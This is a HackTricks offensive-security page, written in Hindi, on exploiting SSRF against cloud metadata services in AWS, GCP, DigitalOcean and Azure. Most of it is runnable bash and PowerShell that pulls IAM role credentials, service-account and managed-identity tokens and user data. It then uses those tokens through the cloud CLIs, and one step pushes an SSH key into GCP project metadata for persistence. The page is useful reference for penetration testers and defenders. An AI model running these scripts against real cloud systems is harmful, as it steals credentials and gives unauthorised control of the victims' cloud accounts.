# Cloud SSRF

{{#include ../../banners/hacktricks-training.md}}

## AWS

### AWS EC2 वातावरण में SSRF का दुरुपयोग

**मेटाडेटा** एंडपॉइंट को किसी भी EC2 मशीन के अंदर से एक्सेस किया जा सकता है और यह इसके बारे में दिलचस्प जानकारी प्रदान करता है। यह URL में उपलब्ध है: `http://169.254.169.254` ([मेटाडेटा के बारे में जानकारी यहाँ](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html))।

मेटाडेटा एंडपॉइंट के **2 संस्करण** हैं। **पहला** संस्करण **GET** अनुरोधों के माध्यम से एंडपॉइंट को **एक्सेस** करने की अनुमति देता है (इसलिए कोई भी **SSRF इसका दुरुपयोग कर सकता है**)। **संस्करण 2** के लिए, [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), आपको एक **टोकन** के लिए **PUT** अनुरोध भेजकर पूछना होगा और फिर उस टोकन का उपयोग करके मेटाडेटा को एक अन्य HTTP हेडर के साथ एक्सेस करना होगा (इसलिए इसे SSRF के साथ **दुरुपयोग करना अधिक जटिल है**)।

> [!CAUTION]
> ध्यान दें कि यदि EC2 उदाहरण IMDSv2 को लागू कर रहा है, [**दस्तावेजों के अनुसार**](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html), **PUT अनुरोध का उत्तर** में **हॉप लिमिट 1** होगा, जिससे EC2 उदाहरण के अंदर एक कंटेनर से EC2 मेटाडेटा को एक्सेस करना असंभव हो जाएगा।
>
> इसके अलावा, **IMDSv2** भी **`X-Forwarded-For` हेडर शामिल करने वाले टोकन को प्राप्त करने के लिए अनुरोधों को ब्लॉक करेगा**। यह गलत कॉन्फ़िगर किए गए रिवर्स प्रॉक्सी को इसे एक्सेस करने से रोकने के लिए है।

आप [दस्तावेजों में मेटाडेटा एंडपॉइंट के बारे में जानकारी](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html) पा सकते हैं। निम्नलिखित स्क्रिप्ट से इसमें से कुछ दिलचस्प जानकारी प्राप्त की जाती है:
```bash
EC2_TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
HEADER="X-aws-ec2-metadata-token: $EC2_TOKEN"
URL="http://169.254.169.254/latest/meta-data"

aws_req=""
if [ "$(command -v curl)" ]; then
aws_req="curl -s -f -H '$HEADER'"
elif [ "$(command -v wget)" ]; then
aws_req="wget -q -O - -H '$HEADER'"
else
echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
fi

printf "ami-id: "; eval $aws_req "$URL/ami-id"; echo ""
printf "instance-action: "; eval $aws_req "$URL/instance-action"; echo ""
printf "instance-id: "; eval $aws_req "$URL/instance-id"; echo ""
printf "instance-life-cycle: "; eval $aws_req "$URL/instance-life-cycle"; echo ""
printf "instance-type: "; eval $aws_req "$URL/instance-type"; echo ""
printf "region: "; eval $aws_req "$URL/placement/region"; echo ""

echo ""
echo "Account Info"
eval $aws_req "$URL/identity-credentials/ec2/info"; echo ""
eval $aws_req "http://169.254.169.254/latest/dynamic/instance-identity/document"; echo ""

echo ""
echo "Network Info"
for mac in $(eval $aws_req "$URL/network/interfaces/macs/" 2>/dev/null); do
echo "Mac: $mac"
printf "Owner ID: "; eval $aws_req "$URL/network/interfaces/macs/$mac/owner-id"; echo ""
printf "Public Hostname: "; eval $aws_req "$URL/network/interfaces/macs/$mac/public-hostname"; echo ""
printf "Security Groups: "; eval $aws_req "$URL/network/interfaces/macs/$mac/security-groups"; echo ""
echo "Private IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv4-associations/"; echo ""
printf "Subnet IPv4: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv4-cidr-block"; echo ""
echo "PrivateIPv6s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv6s"; echo ""
printf "Subnet IPv6: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv6-cidr-blocks"; echo ""
echo "Public IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/public-ipv4s"; echo ""
echo ""
done

echo ""
echo "IAM Role"
eval $aws_req "$URL/iam/info"
for role in $(eval $aws_req "$URL/iam/security-credentials/" 2>/dev/null); do
echo "Role: $role"
eval $aws_req "$URL/iam/security-credentials/$role"; echo ""
echo ""
done

echo ""
echo "User Data"
# Search hardcoded credentials
eval $aws_req "http://169.254.169.254/latest/user-data"

echo ""
echo "EC2 Security Credentials"
eval $aws_req "$URL/identity-credentials/ec2/security-credentials/ec2-instance"; echo ""
```
एक **सार्वजनिक रूप से उपलब्ध IAM क्रेडेंशियल्स** के उदाहरण के लिए आप जा सकते हैं: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws)

आप सार्वजनिक **EC2 सुरक्षा क्रेडेंशियल्स** भी देख सकते हैं: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance)

आप फिर **उन क्रेडेंशियल्स को AWS CLI के साथ उपयोग कर सकते हैं**। यह आपको **उस भूमिका के पास जो अनुमति है, वह सब कुछ करने की अनुमति देगा**।

नए क्रेडेंशियल्स का लाभ उठाने के लिए, आपको इस तरह का एक नया AWS प्रोफ़ाइल बनाना होगा:
```
[profilename]
aws_access_key_id = ASIA6GG71[...]
aws_secret_access_key = a5kssI2I4H/atUZOwBr5Vpggd9CxiT[...]
aws_session_token = AgoJb3JpZ2luX2VjEGcaCXVzLXdlc3QtMiJHMEUCIHgCnKJl8fwc+0iaa6n4FsgtWaIikf5mSSoMIWsUGMb1AiEAlOiY0zQ31XapsIjJwgEXhBIW3u/XOfZJTrvdNe4rbFwq2gMIYBAAGgw5NzU0MjYyNjIwMjkiDCvj4qbZSIiiBUtrIiq3A8IfXmTcebRDxJ9BGjNwLbOYDlbQYXBIegzliUez3P/fQxD3qDr+SNFg9w6WkgmDZtjei6YzOc/a9TWgIzCPQAWkn6BlXufS+zm4aVtcgvBKyu4F432AuT4Wuq7zrRc+42m3Z9InIM0BuJtzLkzzbBPfZAz81eSXumPdid6G/4v+o/VxI3OrayZVT2+fB34cKujEOnBwgEd6xUGUcFWb52+jlIbs8RzVIK/xHVoZvYpY6KlmLOakx/mOyz1tb0Z204NZPJ7rj9mHk+cX/G0BnYGIf8ZA2pyBdQyVbb1EzV0U+IPlI+nkIgYCrwTCXUOYbm66lj90frIYG0x2qI7HtaKKbRM5pcGkiYkUAUvA3LpUW6LVn365h0uIbYbVJqSAtjxUN9o0hbQD/W9Y6ZM0WoLSQhYt4jzZiWi00owZJjKHbBaQV6RFwn5mCD+OybS8Y1dn2lqqJgY2U78sONvhfewiohPNouW9IQ7nPln3G/dkucQARa/eM/AC1zxLu5nt7QY8R2x9FzmKYGLh6sBoNO1HXGzSQlDdQE17clcP+hrP/m49MW3nq/A7WHIczuzpn4zv3KICLPIw2uSc7QU6tAEln14bV0oHtHxqC6LBnfhx8yaD9C71j8XbDrfXOEwdOy2hdK0M/AJ3CVe/mtxf96Z6UpqVLPrsLrb1TYTEWCH7yleN0i9koRQDRnjntvRuLmH2ERWLtJFgRU2MWqDNCf2QHWn+j9tYNKQVVwHs3i8paEPyB45MLdFKJg6Ir+Xzl2ojb6qLGirjw8gPufeCM19VbpeLPliYeKsrkrnXWO0o9aImv8cvIzQ8aS1ihqOtkedkAsw=
```
**aws_session_token** पर ध्यान दें, यह प्रोफ़ाइल के काम करने के लिए अनिवार्य है।

[**PACU**](https://github.com/RhinoSecurityLabs/pacu) का उपयोग खोजे गए क्रेडेंशियल्स के साथ आपके विशेषाधिकारों का पता लगाने और विशेषाधिकार बढ़ाने के लिए किया जा सकता है।

### AWS ECS (कंटेनर सेवा) क्रेडेंशियल्स में SSRF

**ECS**, EC2 इंस्टेंस का एक तार्किक समूह है जिस पर आप एक एप्लिकेशन चला सकते हैं बिना अपने क्लस्टर प्रबंधन अवसंरचना को स्केल किए क्योंकि ECS यह आपके लिए प्रबंधित करता है। यदि आप **ECS** में चल रही सेवा को समझौता करने में सफल होते हैं, तो **मेटाडेटा एंडपॉइंट्स बदल जाते हैं**।

यदि आप _**http://169.254.170.2/v2/credentials/\<GUID>**_ पर पहुँचते हैं, तो आप ECS मशीन के क्रेडेंशियल्स पाएंगे। लेकिन पहले आपको **\<GUID>** ढूंढना होगा। \<GUID> खोजने के लिए आपको मशीन के अंदर **environ** वेरिएबल **AWS_CONTAINER_CREDENTIALS_RELATIVE_URI** को पढ़ना होगा।\
आप इसे `file:///proc/self/environ` पर **Path Traversal** का उपयोग करके पढ़ने में सक्षम हो सकते हैं।\
उल्लिखित http पता आपको **AccessKey, SecretKey और token** देना चाहिए।
```bash
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || wget "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" -O -
```
> [!NOTE]
> ध्यान दें कि **कुछ मामलों** में आप **EC2 मेटाडेटा इंस्टेंस** को कंटेनर से एक्सेस कर सकेंगे (IMDSv2 TTL सीमाओं की जांच करें जो पहले उल्लेखित हैं)। इन परिदृश्यों में, आप कंटेनर से कंटेनर IAM भूमिका और EC2 IAM भूमिका दोनों को एक्सेस कर सकते हैं।

### SSRF for AWS Lambda <a href="#id-6f97" id="id-6f97"></a>

इस मामले में **क्रेडेंशियल्स env वेरिएबल्स में स्टोर होते हैं**। इसलिए, उन्हें एक्सेस करने के लिए आपको कुछ ऐसा एक्सेस करना होगा जैसे **`file:///proc/self/environ`**।

**दिलचस्प env वेरिएबल्स** के **नाम** हैं:

- `AWS_SESSION_TOKEN`
- `AWS_SECRET_ACCESS_KEY`
- `AWS_ACCES_KEY_ID`

इसके अलावा, IAM क्रेडेंशियल्स के अलावा, Lambda फ़ंक्शंस के पास **इवेंट डेटा होता है जो फ़ंक्शन शुरू होने पर पास किया जाता है**। यह डेटा फ़ंक्शन के लिए [runtime interface](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html) के माध्यम से उपलब्ध कराया जाता है और इसमें **संवेदनशील** **जानकारी** हो सकती है (जैसे **stageVariables** के अंदर)। IAM क्रेडेंशियल्स के विपरीत, यह डेटा मानक SSRF के माध्यम से **`http://localhost:9001/2018-06-01/runtime/invocation/next`** पर एक्सेस किया जा सकता है।

> [!WARNING]
> ध्यान दें कि **lambda क्रेडेंशियल्स** **env वेरिएबल्स** के अंदर होते हैं। इसलिए यदि **स्टैक ट्रेस** lambda कोड env वेरिएबल्स को प्रिंट करता है, तो ऐप में **एक त्रुटि उत्पन्न करके उन्हें एक्सफिल्ट्रेट करना संभव है**।

### SSRF URL for AWS Elastic Beanstalk <a href="#id-6f97" id="id-6f97"></a>

हम API से `accountId` और `region` प्राप्त करते हैं।
```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
हम फिर API से `AccessKeyId`, `SecretAccessKey`, और `Token` प्राप्त करते हैं।
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
![](https://miro.medium.com/max/60/0*4OG-tRUNhpBK96cL?q=20) ![](https://miro.medium.com/max/1469/0*4OG-tRUNhpBK96cL)

फिर हम क्रेडेंशियल्स का उपयोग करते हैं `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/` के साथ।

## GCP <a href="#id-6440" id="id-6440"></a>

आप [**यहां मेटाडेटा एंडपॉइंट्स के बारे में दस्तावेज़ पा सकते हैं**](https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata)।

### Google Cloud के लिए SSRF URL <a href="#id-6440" id="id-6440"></a>

HTTP हेडर **`Metadata-Flavor: Google`** की आवश्यकता होती है और आप निम्नलिखित URLs के साथ मेटाडेटा एंडपॉइंट तक पहुंच सकते हैं:

- http://169.254.169.254
- http://metadata.google.internal
- http://metadata

जानकारी निकालने के लिए दिलचस्प एंडपॉइंट्स:
```bash
# /project
# Project name and number
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
# Project attributes
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/attributes/?recursive=true

# /oslogin
# users
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
# groups
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
# security-keys
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
# authorize
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize

# /instance
# Description
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
# Hostname
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
# ID
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Image
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
# Machine Type
curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
# Name
curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
# Tags
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# User data
curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
# Network Interfaces
for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do
echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
echo "  ==============  "
done
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
echo "  Name: $sa"
echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
echo "  ==============  "
done
# K8s Attributtes
## Cluster location
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
## Cluster name
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
## Os-login enabled
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
## Kube-env
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
## Kube-labels
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
## Kubeconfig
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig

# All custom project attributes
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
-H "Metadata-Flavor: Google"

# All custom project attributes instance attributes
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
-H "Metadata-Flavor: Google"
```
Beta को वर्तमान में एक हेडर की आवश्यकता नहीं है (धन्यवाद Mathias Karlsson @avlidienbrunn)
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```
> [!CAUTION]
> **निकाली गई सेवा खाता टोकन** का उपयोग करने के लिए आप बस यह कर सकते हैं:
>
> ```bash
> # Via env vars
> export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
> gcloud projects list
>
> # Via setup
> echo "<token>" > /some/path/to/token
> gcloud config set auth/access_token_file /some/path/to/token
> gcloud projects list
> gcloud config unset auth/access_token_file
> ```

### SSH कुंजी जोड़ें <a href="#id-3e24" id="id-3e24"></a>

टोकन निकालें
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```
टोकन के दायरे की जांच करें (पिछले आउटपुट के साथ या निम्नलिखित चलाकर)
```bash
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  {
"issued_to": "101302079XXXXX",
"audience": "10130207XXXXX",
"scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
"expires_in": 2443,
"access_type": "offline"
}
```
अब SSH कुंजी को पुश करें।
```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"
-H "Content-Type: application/json"
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```
### Cloud Functions <a href="#id-9f1f" id="id-9f1f"></a>

मेटाडेटा एंडपॉइंट VMs की तरह ही काम करता है लेकिन कुछ एंडपॉइंट्स के बिना:
```bash
# /project
# Project name and number
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id

# /instance
# ID
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# Auto MTLS config
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/platform-security/auto-mtls-configuration
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
echo "  Name: $sa"
echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
echo "  ==============  "
done
```
## Digital Ocean <a href="#id-9f1f" id="id-9f1f"></a>

> [!WARNING]
> AWS Roles या GCP सेवा खाता जैसी चीजें नहीं हैं, इसलिए मेटाडेटा बॉट क्रेडेंशियल्स मिलने की उम्मीद न करें

Documentation available at [`https://developers.digitalocean.com/documentation/metadata/`](https://developers.digitalocean.com/documentation/metadata/)
```
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/addressAll in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```
## Azure <a href="#cea8" id="cea8"></a>

### Azure VM

[**Docs** in here](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=linux).

- **ज़रूरी** है कि हेडर `Metadata: true` हो
- **नहीं** होना चाहिए `X-Forwarded-For` हेडर

> [!TIP]
> एक Azure VM में 1 सिस्टम प्रबंधित पहचान और कई उपयोगकर्ता प्रबंधित पहचानें जुड़ी हो सकती हैं। जिसका मतलब है कि आप **VM से जुड़ी सभी प्रबंधित पहचानों का अनुकरण कर सकते हैं**।
>
> **डिफ़ॉल्ट** रूप से, मेटाडेटा एंडपॉइंट **सिस्टम असाइन की गई MI (यदि कोई हो)** का उपयोग करेगा।
>
> दुर्भाग्यवश, मुझे कोई मेटाडेटा एंडपॉइंट नहीं मिला जो यह दर्शाता हो कि एक VM में सभी MIs जुड़ी हैं।
>
> इसलिए, सभी जुड़ी MIs को खोजने के लिए आप कर सकते हैं:
>
> - **az cli** के साथ **जुड़ी पहचानें प्राप्त करें** (यदि आपने पहले से Azure टेनेट में किसी प्रिंसिपल को समझौता किया है)
>
> ```bash
> az vm identity show \
>   --resource-group <rsc-group> \
>   --name <vm-name>
> ```
>
> - मेटाडेटा में डिफ़ॉल्ट जुड़ी MI का उपयोग करके **जुड़ी पहचानें प्राप्त करें**:
>
> ```bash
> export API_VERSION="2021-12-13"
>
> # डिफ़ॉल्ट MI से टोकन प्राप्त करें
> export TOKEN=$(curl -s -H "Metadata:true" \
>   "http://169.254.169.254/metadata/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/" \
>   | jq -r '.access_token')
>
> # आवश्यक विवरण प्राप्त करें
> export SUBSCRIPTION_ID=$(curl -s -H "Metadata:true" \
>   "http://169.254.169.254/metadata/instance?api-version=$API_VERSION" | jq -r '.compute.subscriptionId')
> export RESOURCE_GROUP=$(curl -s -H "Metadata:true" \
>   "http://169.254.169.254/metadata/instance?api-version=$API_VERSION" | jq -r '.compute.resourceGroupName')
> export VM_NAME=$(curl -s -H "Metadata:true" \
>   "http://169.254.169.254/metadata/instance?api-version=$API_VERSION" | jq -r '.compute.name')
>
> # जुड़ी MIs प्राप्त करने का प्रयास करें
> curl -s -H "Authorization: Bearer $TOKEN" \
>   "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.Compute/virtualMachines/$VM_NAME?api-version=$API_VERSION" | jq
> ```
>
> - टेनेट में सभी परिभाषित प्रबंधित पहचानों को **प्राप्त करें** और देखें कि क्या उनमें से कोई VM से जुड़ी है:
>
> ```bash
> az identity list
> ```

> [!CAUTION]
> टोकन अनुरोधों में `object_id`, `client_id` या `msi_res_id` में से किसी भी पैरामीटर का उपयोग करें ताकि आप जिस प्रबंधित पहचान का उपयोग करना चाहते हैं उसे इंगित कर सकें ([**docs**](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)). यदि कोई नहीं, तो **डिफ़ॉल्ट MI का उपयोग किया जाएगा**।

{{#tabs}}
{{#tab name="Bash"}}
```bash
HEADER="Metadata:true"
URL="http://169.254.169.254/metadata"
API_VERSION="2021-12-13" #https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions

echo "Instance details"
curl -s -f -H "$HEADER" "$URL/instance?api-version=$API_VERSION"

echo "Load Balancer details"
curl -s -f -H "$HEADER" "$URL/loadbalancer?api-version=$API_VERSION"

echo "Management Token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"

echo "Graph token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/"

echo "Vault token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"

echo "Storage token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://storage.azure.com/"
```
{{#endtab}}

{{#tab name="PS"}}
```bash
# Powershell
Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -NoProxy -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64
## User data
$userData = Invoke- RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021- 01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

# Paths
/metadata/instance?api-version=2017-04-02
/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
/metadata/instance/compute/userData?api-version=2021-01-01&format=text
```
{{#endtab}}
{{#endtabs}}

### Azure App & Functions Services

**env** से आप **`IDENTITY_HEADER`** और **`IDENTITY_ENDPOINT`** के मान प्राप्त कर सकते हैं। जिसका उपयोग आप मेटाडेटा सर्वर के साथ बात करने के लिए एक टोकन इकट्ठा करने के लिए कर सकते हैं।

अधिकतर, आप इनमें से किसी एक संसाधन के लिए टोकन चाहते हैं:

- [https://storage.azure.com](https://storage.azure.com/)
- [https://vault.azure.net](https://vault.azure.net/)
- [https://graph.microsoft.com](https://graph.microsoft.com/)
- [https://management.azure.com](https://management.azure.com/)

> [!CAUTION]
> टोकन अनुरोधों में `object_id`, `client_id` या `msi_res_id` में से किसी भी पैरामीटर का उपयोग करें ताकि आप जिस प्रबंधित पहचान का उपयोग करना चाहते हैं उसे इंगित किया जा सके ([**docs**](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token))। यदि कोई नहीं, तो **डिफ़ॉल्ट MI का उपयोग किया जाएगा**।

{{#tabs}}
{{#tab name="Bash"}}
```bash
# Check for those env vars to know if you are in an Azure app
echo $IDENTITY_HEADER
echo $IDENTITY_ENDPOINT

# (Fingerprint) You should also be able to find the folder:
ls /opt/microsoft

# Get management token
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
# Get graph token
curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
# Get vault token
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
# Get storage token
curl "$IDENTITY_ENDPOINT?resource=https://storage.azure.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
```
{{#endtab}}

{{#tab name="PS"}}
```powershell
# Define the API version
$API_VERSION = "2019-08-01"

# Function to get a token for a specified resource
function Get-Token {
param (
[string]$Resource
)
$url = "$IDENTITY_ENDPOINT?resource=$Resource&api-version=$API_VERSION"
$headers = @{
"X-IDENTITY-HEADER" = $IDENTITY_HEADER
}
try {
$response = Invoke-RestMethod -Uri $url -Headers $headers -Method Get
$response.access_token
} catch {
Write-Error "Error obtaining token for $Resource: $_"
}
}

# Get Management Token
$managementToken = Get-Token -Resource "https://management.azure.com/"
Write-Host "Management Token: $managementToken"

# Get Graph Token
$graphToken = Get-Token -Resource "https://graph.microsoft.com/"
Write-Host "Graph Token: $graphToken"

# Get Vault Token
$vaultToken = Get-Token -Resource "https://vault.azure.net/"
Write-Host "Vault Token: $vaultToken"

# Get Storage Token
$storageToken = Get-Token -Resource "https://storage.azure.com/"
Write-Host "Storage Token: $storageToken"








# API request in powershell to management endpoint
$Token = 'eyJ0eX..'
$URI='https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# API request to graph endpoint (get enterprise applications)
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# Using AzureAD Powershell module witho both management and graph tokens
$token = 'eyJ0e..'
$graphaccesstoken = 'eyJ0eX..'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 2e91a4f12984-46ee-2736-e32ff2039abc

# Try to get current perms over resources
Get-AzResource
## The following error means that the user doesn't have permissions over any resource
Get-AzResource : 'this.Client.SubscriptionId' cannot be null.
At line:1 char:1
+ Get-AzResource
+ ~~~~~~~~~~~~~~
+ CategoryInfo : CloseError: (:) [Get-AzResource],ValidationException
+ FullyQualifiedErrorId :
Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet
```
{{#endtab}}
{{#endtabs}}

